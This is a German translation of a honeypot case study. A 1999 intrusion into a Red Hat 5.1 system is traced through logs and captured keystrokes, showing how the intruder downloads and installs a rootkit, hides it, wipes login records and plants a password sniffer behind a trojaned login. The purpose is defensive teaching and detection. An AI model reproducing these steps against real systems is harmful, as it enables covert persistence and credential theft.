@@ -1,0 +1,509 @@
+Den Feind Kennen III
+
+Dies ist der dritte Artikel aus einer Serie, die sich auf das Script Kiddie 
+konzentriert. Der erste Teil beschäftigt sich damit, wie Script Kiddies 
+Schwächen suchen, identifizieren und ausnutzen. Der zweite Teil erklärt, wie man 
+solche Versuche erkennt, die eingesetzten Tools identifiziert und erkennt, 
+wonach gesucht wird. Dieser Teil, der dritte, konzentriert sich darauf, was 
+passiert, wenn sie erst mal root sind und hier besonders darauf, wie sie ihre 
+Spuren verwischen und was sie als nächstes tun.
+
+
+Wer ist das "Script Kiddie"?
+============================
+
+ie bereits im ersten Teil erklärt, ist das "Script Kiddie" nicht so sehr eine 
+Person als vielmehr eine Strtegie: die Strategie, nach dem schnellen Erfolg zu 
+suchen. Man sucht nicht nach speziellen Informationen oder greift eine spezielle 
+Firma an, es geht nur darum, so einfach wie möglich root zu werden. 
+Eindringlinge versuchen das, indem sie sich auf eine kleine Anzahl Schwächen 
+beschränken und dann das ganze Internet danach absuchen. Dies ist nicht zu 
+unerschätzen, denn früher oder später finden sie jemand verwundbaren.
+
+Wenn sie erstmal ein verwundbares System gefunden haben und root geworden sind, 
+werden normalerweise als erstes die Spuren verwischt. Sie möchten sichergehen, 
+daß Du nicht weißt, daß dein System gehackt wurde und daß Du ihre Aktionen nicht 
+sehen oder loggen kanst. Danach benutzten sie dein System oft, um andere 
+Netzwerke zu scannen oder überwachen dein System im Stillen. Um besser zu 
+verstehen, wie sie dieses bewerkstelligen, folgen wir einfach den Schritten auf 
+einem System das von einem Eindringling mit Hilfe von "Script Kiddie"-Taktiken 
+geknackt wurde. Unser System namens Mozart läuft unter Red Hat Linux 5.1 und 
+wurde am 27.04.1999 kompromittiert. Es folgen die tatsächlichen Schritte, die 
+der Störenfried gemacht hat, mit den Systemlogs und Tastatureingaben um jeden 
+Schritt nachvollziehen zu können. Alle Systemlogs wurden auf einem geschützten 
+Syslogserver abgelegt und alle Eingaben wurden mit Hilfe von sniffit 
+(ftp://ftp.technotronic.com/unix/network-sniffers) aufgezeichnet. Mehr 
+Informationen darüber, wie die Informationen gesammelt wurden stehen in "Wie 
+baut man einen Honigtopf" (http://www.enteract.com/~lspitz/honeypot.html). Im 
+folgenden wird der Eindringling immer als "er" bezeichnet, obwohl wir keine 
+Ahnung über das tatsächliche Geschlecht des Täters haben.
+
+
+
+Der Angriff
+===========
+
+Am 27.04. um 00:13 Uhr wurde unser Netzwerk von einem System 1Cust174.tnt2.long-
+branch.nj.da.uu.net auf verschiedene Schwächen inklusive nmap gescannt. Unser 
+Eindringling hat dabei "Lärm" gemacht, da jedes unserer Systeme getestet wurde 
+(mehr Informationen über das erkennen und analysieren solcher Scans finden sich 
+im zweiten Teil). 
+
+	Apr 27 00:12:25 mozart imapd[939]: connect from 208.252.226.174 
+	Apr 27 00:12:27 bach imapd[1190]: connect from 208.252.226.174 
+	Apr 27 00:12:30 vivaldi imapd[1225]: connect from 208.252.226.174 
+
+Anscheinend hat er etwas gefunden, was ihm gefallen hat, denn er kam am gleichen 
+Tag noch um 06:52 und 16:47 Uhr zurück. Er begann mit einem intensiveren Test 
+und konzentrierte sich dabei auf das System Mozart. Er fand eine Schwäche und 
+startete einen erfolgreichen Angriff gegen mountd, eine allgemein bekannte 
+Schwachstelle in Red Hat 5.1. Hier kann man in /var/log/messages sehen, wie der 
+Eindringling root wurde. Das Tool, das er dazu benutzte war wahrscheinlich 
+ADMountd.c /ftp://adm.freelsd.net/pub/ADM) oder etwas ähnliches.
+
+	Apr 27 16:47:28 mozart mountd[306]: Unauthorized access by NFS client 
+208.252.226.174. 
+	Apr 27 16:47:28 mozart syslogd: Cannot glue message parts together 
+	Apr 27 16:47:28 mozart mountd[306]: Blocked attempt of 208.252.226.174 to 
+mount 
+	~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P 
+	~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~
+
+Direkt im Anschluß sehen wir in /var/adm/messages, wie unser Eindringling root 
+wurde, indem er sich per Telnet als User crak0 einloggte und sich dann per su 
+zum User rewt machte. Beide Accounts wurden durch das Angriffsskript angelegt. 
+Jetzt hat er volle Kontrolle über das System.
+
+	Apr 27 16:50:27 mozart login[1233]: FAILED LOGIN 2 FROM 
+1Cust102.tnt1.long-branch.nj.da.uu.net FOR crak, 	User not known to the 
+underlying authentication module 
+	Apr 27 16:50:38 mozart PAM_pwdb[1233]: (login) session opened for user 
+crak0 by (uid=0) 
+	Apr 27 16:50:38 mozart login[1233]: LOGIN ON ttyp0 BY crak0 FROM 
+1Cust102.tnt1.long-branch.nj.da.uu.net 
+	Apr 27 16:50:47 mozart PAM_pwdb[1247]: (su) session opened for user rewt 
+by crak0(uid=0)
+
+
+Spuren verwischen
+=================
+
+Der Fremde ist jetzt als root im System. Wie wir jetzt sehen werden, ist sein 
+nächster Schritt sicherzustellen, das er nicht erwischt wird. Als erstes prüft 
+er, ob noch andere User angemeldet sind:
+
+	[crak0@mozart /tmp]$ w 
+	  4:48pm  up 1 day, 18:27,  1 user,  load average: 0.00, 0.00, 0.00 
+	USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT 
+	crak0    ttyp0    1Cust102.tnt1.lo  4:48pm  0.00s  0.23s  0.04s  w
+
+Nachdem er festgestellt hat, daß er allein ist, wird alle seine Taten unsichtbar 
+machen wollen. Das bedeutet normalerweise, das er alle Beweise aus den Logfiles 
+löscht und Systemdateien wie ps oder netstat durch Trojanische Pferde ersetzt, 
+so daß man ihn im System nicht erkennen kann. Sind die Trojaner erst einmal 
+installiert, hat er die totale Kontrolle über das System und Du wirst es sehr 
+wahrscheinlich niemals herausbekommen. Genauso, wie es Skripte zum 
+automatisiertem Hacken gibt, gibt es auch Skripte zum automatischen verstecken 
+von Eindringlingen, oft rootkits genannt. Eines der gebräuchlicheren ist lrk4 
+(ftp://ftp.technotronic.com/unix/trojans). Durch das Ausführen des Skripts 
+werden eine Reihe kritischer Dateien ersetzt und tarnen den User in wenigen 
+Sekunden. Mehr Informationen über rootkits finden sich im Readme von lrk4. 
+Dadurch bekommt man eine bessere Vorstellung wie diese rootkits im allgemeinen 
+funktionieren. Ich würde auch empfehlen, hide-and-seek 
+(http://www.enteract.com/~lspitz/hide-n-seek.html) zu lesen, ein Text über das 
+Spuren verwischen, geschrieben von den Bösen.
+
+Innerhalb weniger Minuten, nachdem das System kompromittiert war, konnte man 
+beobachten, wie der Eindringling das rootkit herunterlud und mit "make install" 
+implementierte. Es folgen seine tatsächlichen Tastatureingaben um sich 
+unsichtbar zu machen:
+
+	cd /dev/ 
+	su rewt 
+	mkdir ". " 
+	cd ". " 
+	ftp technotronic.com 
+	anonymous 
+	fdfsfdsdfssd@aol.com 
+	cd /unix/trojans 
+	get lrk4.unshad.tar.gz 
+	quit 
+	ls 
+	tar -zxvf lrk4.unshad.tar.gz 
+	mv lrk4 proc 
+	mv proc ". " 
+	cd ". " 
+	ls 
+	make install
+
+Beachte, daß er als erstes ein verstecktes Verzeichnis "." erzeugt, um darin 
+sein rootkit zu verstecken. Dieses Verzeichnis taucht beim "ls" Befehl nicht auf 
+und sieht bei einem "ls -la" wie das lokale Verzeichnis aus. Eine Möglichkeit 
+dieses Verzeichnis zu finden ist das "find" Kommando (stelle sicher, daß Du der 
+Integrität deiner "find" Datei vertrauen kannst):
+
+	mozart #find / -depth -name "*.*" 
+	/var/lib/news/.news.daily 
+	/var/spool/at/.SEQ 
+	/dev/. /. /procps-1.01/proc/.depend 
+	/dev/. /. 
+	/dev/.
+
+Unser Störenfried mag ja gut im Umgang mit Trojanern sein, aber sein Ansatz um 
+die Logdateien zu säubern, war etwas einfacher gestrickt. Anstatt Tools wie zap2 
+oder clean zu nutzen, kopierte er einfach /dev/null in die Dateien /var/run/utmp 
+und /var/log/utmp und löschte /var/log/wtmp. Man ahnt, daß etwas faul ist, wenn 
+diese Dateien leer sind oder man den folgenden Fehler bekommt:
+
+	[root@mozart sbin]# last -10 
+	last: /var/log/wtmp: No such file or directory 
+	Perhaps this file was removed by the operator to prevent logging last 
+info.
+
+
+Der nächste Schritt
+===================
+
+Wenn Eindringlinge erst einmal ein System kompromittiert haben, neigen sie dazu, 
+eines von zwei Dingen zu tun. Entweder sie benutzen das System dazu, andere 
+Rechner im Internet zu scannen oder sie machen es sich gemütlich und sehen zu, 
+was sie über Dein System lernen können, z.B. Accounts oder Passwörter für andere 
+Systeme. Unser Eindringling entschied sich für die zweite Variante: zurücklehnen 
+und sehen, was man lernen kann. Er installierte einen Sniffer, der unseren 
+gesamten Netzwerkverkehr abfing, inklusive der Telnet und ftp Verbindungen zu 
+anderen Systemen. Auf diese Weise konnte er Logins und Passwörter in Erfahrung 
+bringen. In /var/log/messages sehen wir, wie das System kurz nach dem Einbruch 
+in den "promiscuous mode" geht:
+
+
+	Apr 27 17:03:38 mozart kernel: eth0: Setting promiscuous mode. 
+	Apr 27 17:03:43 mozart kernel: eth0: Setting promiscuous mode. 
+
+Nachdem er seine Trojaner-Binaries installiert, die Logs gesäubert und den 
+Sniffer gestartet hatte, trennte der Eindringling die Verbindung. Wir werden ihn 
+jedoch am nächsten wiederkehren sehen, um herauszufinden, was für Verkehr er 
+aufgefangen hatte.
+
+
+
+Schadensbegrenzung
+==================
+
+Da unser Freund die Verbindung gekappt hatte, bekam ich die Möglichkeit das 
+System zu prüfen und herauszufinden was genau geschehen war. Ich war sehr daran 
+interessiert herauszufinden, was verändert worden war und wo er die 
+Informationen, die der Sniffer sammelte, ablegte. Zuerst fand ich mit Hilfe von 
+tripwire (ftp://coast.cs.purdue.edu/pub/COAST/Tripwire) schnell heraus, welche 
+Dateien modifiziert waren. Anmerkung: stelle sicher, das tripwire von der 
+sicheren Quelle gestartet wird. Ich lasse gerne eine statisch gelinkte Version 
+von einer Floppy mit Schreibschutz laufen. Tripwire zeigte folgendes:
+
+	added:   -rw-r--r-- root            5 Apr 27 17:01:16 1999 
+/usr/sbin/sniff.pid 
+	added:   -rw-r--r-- root          272 Apr 27 17:18:09 1999 
+/usr/sbin/tcp.log 
+	changed: -rws--x--x root        15588 Jun  1 05:49:22 1998 /bin/login 
+	changed: drwxr-xr-x root        20480 Apr 10 14:44:37 1999 /usr/bin 
+	changed: -rwxr-xr-x root        52984 Jun 10 04:49:22 1998 /usr/bin/find 
+	changed: -r-sr-sr-x root       126600 Apr 27 11:29:18 1998 /usr/bin/passwd 
+	changed: -r-xr-xr-x root        47604 Jun  3 16:31:57 1998 /usr/bin/top 
+	changed: -r-xr-xr-x root         9712 May  1 01:04:46 1998 
+/usr/bin/killall 
+	changed: -rws--s--x root       116352 Jun  1 20:25:47 1998 /usr/bin/chfn 
+	changed: -rws--s--x root       115828 Jun  1 20:25:47 1998 /usr/bin/chsh 
+	changed: drwxr-xr-x root         4096 Apr 27 17:01:16 1999 /usr/sbin 
+	changed: -rwxr-xr-x root       137820 Jun  5 09:35:06 1998 /usr/sbin/inetd 
+	changed: -rwxr-xr-x root         7229 Nov 26 00:02:19 1998 
+/usr/sbin/rpc.nfsd 
+	changed: -rwxr-xr-x root       170460 Apr 24 00:02:19 1998 
+/usr/sbin/in.rshd 
+	changed: -rwxr-x--- root       235516 Apr  4 22:11:56 1999 
+/usr/sbin/syslogd 
+	changed: -rwxr-xr-x root        14140 Jun 30 14:56:36 1998 /usr/sbin/tcpd 
+	changed: drwxr-xr-x root         2048 Apr  4 16:52:55 1999 /sbin 
+	changed: -rwxr-xr-x root        19840 Jul  9 17:56:10 1998 /sbin/ifconfig 
+	changed: -rw-r--r-- root          649 Apr 27 16:59:54 1999 /etc/passwd
+
+Wie man sehen kann wurde eine Vielzahl von Dateien un Binaries modifiziert. Es 
+gab keine neuen Einträge in der /etc/passwd (schlauerweise hatte er den crak0 
+und rewt Eintrag wieder gelöscht), also mußte er in einer der modifizierten 
+Binaries eine Hintertür offen gelassen haben. Außerdem waren zwei Dateien 
+hinzugefügt worden, /usr/sbin/sniff.pid und /usr/sbin/tcp.log. Nicht ganz 
+überraschend war /usr/sbin/sniff.pid die pid des Sniffers und /usr/sbin/tcp.log 
+war die Datei in der er alle gesammelten Informationen ablegt. Ausgehend von 
+/usr/sbin/sniff.pid stellte sich heraus, das rpc.nfsd der Sniffer war. Unser 
+Eindringling hatte einen Sniffer kompiliert, in diesem Fall linsniffer, und 
+rpc.nfsd damit ersetzt. Das stellte sicher, das auch nach einem reboot der 
+Sniffer durch den init-Prozeß gestartet wurde. Folgendes bestätigt, das rpc.nfsd 
+der Sniffer ist:
+
+	mozart #strings /usr/sbin/rpc.nfsd | tail -15 
+	cant get SOCK_PACKET socket 
+	cant get flags 
+	cant set promiscuous mode 
+	----- [CAPLEN Exceeded] 
+	----- [Timed Out] 
+	----- [RST] 
+	----- [FIN] 
+	%s => 
+	%s [%d] 
+	sniff.pid 
+	eth0 
+	tcp.log 
+	cant open log 
+	rm %s 
+
+Nachdem ich mein System untersucht und verstanden hatte, was vorgegangen war, 
+ließ ich es alleine. Ich war neugierig, was seine nächsten Schritte sein würden. 
+Ich wollte nicht, daß er wußte, daß ich ihn erwischt hatte, deshalb löschte ich 
+alle meine Spuren aus /usr/sbin/tcp.log.
+
+
+Die Rückkehr des Script Kiddies
+===============================
+
+Am nächsten Tag kam unser Freund wieder. Durch loggen seiner Tastatureingaben 
+fand ich schnell die Hintertür: /bin/login war ein Trojaner. Diese Binary, die 
+für Telnetsitzungen verwendet wird, war so konfiguriert, das der Account "rewt" 
+mit dem Passwort "satori" root Rechte erhielt. "satori" ist das Standardpasswort 
+für alle Trojaner, die von lrk4 installiert werden, ein sicheres 
+Erkennungszeichen, daß Dein System kompromittiert sein könnte.
+
+Der Eindringling prüfte, ob der Sniffer noch funktionierte. Außerdem wollte er 
+wissen, ob irgendwelche Accounts seit dem vorherigen Tag abgefangen wurden. Hier 
+seine Eingaben:
+
+	Red Hat Linux release 5.1 (Manhattan)
+	Kernel 2.0.35 on an i586
+
+	mozart login: rewt
+	Password: 
+	[root@mozart /root]# w
+	  4:11pm  up 17:39,  0 users,  load average: 0.00, 0.00, 0.00
+	USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+	[root@mozart /root]# ps aux
+	USER       PID %CPU %MEM  SIZE   RSS TTY STAT START   TIME COMMAND
+	bin        250  0.0  1.1   776   352  ?  S   03:32   0:00 portmap 
+	daemon     228  0.0  1.3   796   416  ?  S   03:32   0:00 /usr/sbin/atd 
+	root         1  0.0  1.4   792   432  ?  S   03:31   0:03 init [3] 
+	root         2  0.0  0.0     0     0  ?  SW  03:31   0:00 (kflushd)
+	root         3  0.0  0.0     0     0  ?  SW< 03:31   0:00 (kswapd)
+	root         4  0.0  0.0     0     0  ?  SW  03:31   0:00 (md_thread)
+	root         5  0.0  0.0     0     0  ?  SW  03:31   0:00 (md_thread)
+	root        36  0.0  1.1   752   364  ?  S   03:32   0:00 /sbin/kerneld 
+	root        61  0.0  2.2  1196   688  ?  S   03:32   0:00 bash 
+/etc/rc.d/rc 3 
+	root       208  0.0  0.4   268   152  ?  S   03:32   0:00 syslogd 
+	root       217  0.0  1.7   928   548  ?  S   03:32   0:00 klogd 
+	root       239  0.0  1.5   864   488  ?  S   03:32   0:00 crond 
+	root       261  0.0  2.5  1252   776  ?  S   03:32   0:00 /usr/sbin/snmpd 
+-f 
+	root       273  0.0  0.4   168   140  ?  S   03:32   0:00 inetd 
+	root       284  0.0  2.0  1000   620  ?  S   03:32   0:00 named 
+	root       297  0.0  2.2  1192   684  ?  S   03:32   0:00 sh 
+/etc/rc.d/rc3.d/S6
+	root       306  0.0  1.6   852   504  ?  S   03:32   0:00 rpc.mountd 
+	root       314  0.0  1.3   876   404  ?  S   03:32   0:00 rpc.nfsd 
+	root       599  0.4  2.2  1240   696  ?  S   21:11   0:00 in.telnetd 
+	root       600  1.3  2.5  1184   772  p0 S   21:11   0:00 -bash 
+	root       614  0.0  1.2   920   400  p0 R   21:11   0:00 ps aux 
+	[root@mozart /root]# cd /usr/sbin
+	[root@mozart sbin]# ls
+	ClockProg             innd                  sendfax
+	SVGATextMode          inndstart             sendmail
+	accton                ipop2d                set80
+	adduser               ipop3d                setVGAreg
+	am-eject              kbdconfig             setclock
+	amd                   klogd                 setconsole
+	amq                   logrotate             setpalette
+	apmd                  lpc                   setup
+	atd                   lpd                   showmount
+	atrun                 lpf                   sliplogin
+	automount             makewhatis            smbd
+	bootpd                mk-amd-map            smbmount
+	bootpef               mkdict                smbumount
+	bootptest             mkpasswd              sndconfig
+	callback              mouseconfig           sniff.pid
+	chat                  named                 snmpd
+	chpasswd              named-xfer            snmptrapd
+	chroot                named.reload          squid
+	clockprobe            named.restart         squid.novm
+	create-cracklib-dict  ncpserv               stm
+	crond                 ndc                   stm-menu
+	ctlinnd               newusers              strfile
+	dbmmanage             nmbd                  swapdev
+	dhcpd                 ntpdate               syslogd
+	dhcrelay              ntpq                  tcp.log
+	dip                   ntptrace              tcpd
+	diplogin              ntsysv                tcpdchk
+	dump-acct             nwbind                tcpdmatch
+	dump-utmp             nwclient              tcpdump
+	edquota               nwconn                tickadj
+	exportfs              nwserv                timeconfig
+	faxrunqd              pac                   timed
+	fixmount              packer                timedc
+	fsinfo                pmap_dump             tmpwatch
+	fuser                 pmap_set              traceroute
+	gated                 portmap               try-from
+	getVGAreg             pppd                  tunelp
+	getpalette            pppstats              unstr
+	grabmode              pwck                  useradd
+	groupadd              pwconv                userdel
+	groupdel              pwunconv              userhelper
+	groupmod              quotastats            usermod
+	grpck                 ramsize               usernetctl
+	grpconv               rdev                  uuchk
+	grpunconv             rdistd                uucico
+	hlfsd                 readprofile           uuconv
+	htdigest              repquota              uusched
+	htpasswd              rhbackup              uuxqt
+	httpd                 rmt                   vidmode
+	huntd                 rootflags             vipw
+	imapd                 routed                warnquota
+	in.comsat             rpc.bootparamd        wire-test
+	in.fingerd            rpc.mountd            wsmbconf
+	in.ftpd               rpc.nfsd              xferstats
+	in.identd             rpc.rquotad           xntpd
+	in.nnrpd              rpc.rusersd           xntpdc
+	in.ntalkd             rpc.rwalld            ypbind
+	in.rexecd             rpc.yppasswdd         yppoll
+	in.rlogind            rpc.ypxfrd            yppush
+	in.rshd               rpcinfo               ypserv
+	in.talkd              rwhod                 ypset
+	in.telnetd            sa                    zdump
+	in.tftpd              safe_finger           zic
+	in.timed              samba
+	inetd                 sbpnpprobe
+	[root@mozart sbin]# paste tcp.log
+	
+	1Cust118.tnt1.long-branch.nj.da.uu.net => mozart [23]
+	 #'vt1002!rewt
+	satori
+	last -210110
+	cd /log
+	ls
+	/cd /var/log
+	ls
+	
+	----- [Timed Out]
+	
+	router => mozart [23]
+	 !"'#o% 38400,38400'VT100root
+	fergit
+	ls
+	cat /etc/hosts
+	
+	----- [Timed Out]
+	Exiting...
+	[root@mozart sbin]# w
+	  4:11pm  up 17:39,  0 users,  load average: 0.00, 0.00, 0.00
+	USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+	[root@mozart sbin]# cat /etc/hosts
+	127.0.0.1               localhost localhost.localdomain
+	172.20.1.130            mozart mozart
+	172.20.1.1      router
+	[root@mozart sbin]# uname -a
+	Linux mozart 2.0.35 #1 Tue Jul 14 23:56:39 EDT 1998 i586 unknown
+	[root@mozart sbin]# netstat -r
+	Kernel IP routing table
+	Destination     Gateway         Genmask         Flags   MSS Window  irtt 
+Iface
+	172.20.1.0      *               255.255.255.0   U      1500 0          0 
+eth0
+	127.0.0.0       *               255.0.0.0       U      3584 0          0 
+lo
+	default         router          0.0.0.0         UG     1500 0          0 
+eth0
+	[root@mozart sbin]# netstat -rs
+	netstat: illegal option -- s
+	usage: netstat [-veenNcCF] [<Af>] -r         netstat {-V|--version|-h|--
+help}
+	       netstat [-vnNcaeo] [<Socket>]
+	       netstat { [-veenNac] -i | [-vnNc] -L | [-cnNe] -M }
+	
+        	-r, --route              display routing table
+	        -L, --netlink            display netlink kernel messages
+	        -i, --interfaces         display interface table
+	        -M, --masquerade         display masqueraded connections
+	
+	        -v, --verbose            be verbose
+	        -n, --numeric            dont resolve names
+	        -e, --extend             display other/more informations
+	        -c, --continuous         continuous listing
+	
+	        -a, --all, --listening   display all
+	        -o, --timers             display timers
+	
+	<Socket>={-t|--tcp} {-u|--udp} {-w|--raw} {-x|--unix} --ax25 --ipx --
+netrom
+	<Af>= -A {inet|ipx|netrom|ddp|ax25},... --inet --ipx --netrom --ddp --ax25
+	[root@mozart sbin]#ls
+	ClockProg             innd                  sendfax
+	SVGATextMode          inndstart             sendmail
+	accton                ipop2d                set80
+	adduser               ipop3d                setVGAreg
+	am-eject              kbdconfig             setclock
+	amd                   klogd                 setconsole
+	amq                   logrotate             setpalette
+	apmd                  lpc                   setup
+	<SCHNIPP, den Rest habe ich gekürzt JB>
+	[root@mozart sbin]# rpc.nfsd
+	ÿò[root@mozart sbin]# ps aux
+	USER       PID %CPU %MEM  SIZE   RSS TTY STAT START   TIME COMMAND
+	bin        250  0.0  1.1   776   352  ?  S   03:32   0:00 portmap 
+	daemon     228  0.0  1.3   796   416  ?  S   03:32   0:00 /usr/sbin/atd 
+	root         1  0.0  1.4   792   432  ?  S   03:31   0:03 init [3] 
+	root         2  0.0  0.0     0     0  ?  SW  03:31   0:00 (kflushd)
+	root         3  0.0  0.0     0     0  ?  SW< 03:31   0:00 (kswapd)
+	root         4  0.0  0.0     0     0  ?  SW  03:31   0:00 (md_thread)
+	root         5  0.0  0.0     0     0  ?  SW  03:31   0:00 (md_thread)
+	root        36  0.0  1.1   752   364  ?  S   03:32   0:00 /sbin/kerneld 
+	root        61  0.0  2.2  1196   688  ?  S   03:32   0:00 bash 
+/etc/rc.d/rc 3 
+	root       208  0.0  0.4   268   152  ?  S   03:32   0:00 syslogd 
+	root       217  0.0  1.7   928   548  ?  S   03:32   0:00 klogd 
+	root       239  0.0  1.5   864   488  ?  S   03:32   0:00 crond 
+	root       261  0.0  2.5  1252   776  ?  S   03:32   0:00 /usr/sbin/snmpd 
+-f 
+	root       273  0.0  0.4   168   140  ?  S   03:32   0:00 inetd 
+	root       284  0.0  2.0  1000   620  ?  S   03:32   0:00 named 
+	root       297  0.0  2.2  1192   684  ?  S   03:32   0:00 sh 
+/etc/rc.d/rc3.d/S6
+	root       306  0.0  1.6   852   504  ?  S   03:32   0:00 rpc.mountd 
+	root       314  0.0  1.3   876   404  ?  S   03:32   0:00 rpc.nfsd 
+	root       599  0.0  2.2  1240   696  ?  S   21:11   0:00 in.telnetd 
+	root       600  0.1  2.5  1184   772  p0 S   21:11   0:00 -bash 
+	root       626  0.0  1.2   920   400  p0 R   21:12   0:00 ps aux 
+	[root@mozart sbin]# rm tcp.log
+	rm: remove `tcp.log'? y
+	[root@mozart sbin]# kill -9 314
+	[root@mozart sbin]# rm rpc.nfsd
+
+Beachte, das er ganz zum Schluß den Sniffer stoppt. Das war das letzte, was er 
+vor der Beendigung der Sitzung tat. Er kam jedoch schnell zurück, nur um den 
+Sniffer neu zu starten. Ich bin mir nicht ganz sicher, warum er das getan hat.
+
+Dieser Vorgang des Systemchecks wiederholte sich für einige Tage. Jeden Tag kam 
+der Eindringling zurück, um zu prüfen, ob der Sniffer noch lief und ob er 
+irgendwelche wertvollen Daten gesammelt hatte. Nach dem vierten Tag beschloß 
+ich, daß es nun genug sei und trennte das System. Ich hatte genug von dem 
+Eindringling gelernt und schien nichts neues mehr lernen zu können.
+
+
+
+Schlußfolgerung
+===============
+
+Wir haben hier von Anfang bis Ende gesehen, wie sich ein Eindringling benehmen 
+könnte, sobald sie erst mal root sind. Sie fangen oft damit an, zu prüfen ob 
+irgendjemand auf dem System ist. Wenn sie erst mal wissen, daß sie allein sind, 
+verwischen sie ihre Spuren, indem sie Logfiles säubern und wichtige Dateien 
+verändern bzw. modifizieren. Wenn sie erst mal sicher versteckt sind starten sie 
+neue und schädlichere Aktivitäten. Um sich besser gegen diese Bedrohung zu 
+schützen, empfehle ich seine Systeme zu sichern (panzern). Grundlegender Schutz 
+reicht für die meisten Script Kiddies da sie nach dem leichten Opfer suchen. 
+Eine Vorstellung davon, wie man sein System sichert (panzert), bekommt man bei 
+http://www.enteract.com/~lspitz/linux.html bzw. 
+http://www.enteract.com/~lspitz/solaris.html. Wenn es zu spät ist und Dein 
+System schon kompromittiert wurde, kann man hier nachlesen 
+http://www.cert.org/nav/recovering.html
